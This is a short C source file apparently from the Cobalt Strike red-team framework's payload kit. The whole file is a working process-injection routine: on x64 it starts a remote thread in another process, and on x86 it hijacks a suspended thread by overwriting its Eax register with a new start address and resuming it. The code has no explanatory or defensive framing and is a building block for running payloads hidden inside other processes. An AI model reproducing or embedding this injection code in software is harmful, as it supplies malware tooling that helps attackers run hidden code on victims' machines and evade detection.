/*
 * (c) 2017 Strategic Cyber LLC
 *
 * See https://www.cobaltstrike.com/license
 */
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>

#ifdef _IS64_
/* use the x64 -> WOW64 logic */
void start_thread(HANDLE hProcess, PROCESS_INFORMATION pi, LPVOID lpStartAddress) {
	/* grr... MinGW-w64 does not include WOW64_CONTEXT and needed function
	   definitions. We're going to revert to boring CreateRemoteThread */
	CreateRemoteThread(hProcess, NULL, 0, lpStartAddress, NULL, 0, NULL);
}
#else
/* x86 -> x86 */
void start_thread(HANDLE hProcess, PROCESS_INFORMATION pi, LPVOID lpStartAddress) {
	CONTEXT ctx;

	/* try to query some information about our thread */
	ctx.ContextFlags = CONTEXT_INTEGER;
	if (!GetThreadContext(pi.hThread, &ctx))
		return;

	/* update the Eax value to our new start address */
	ctx.Eax = (DWORD)lpStartAddress;
	if (!SetThreadContext(pi.hThread, &ctx))
		return;

	/* kick off the thread, please */
	ResumeThread(pi.hThread);
}
#endif
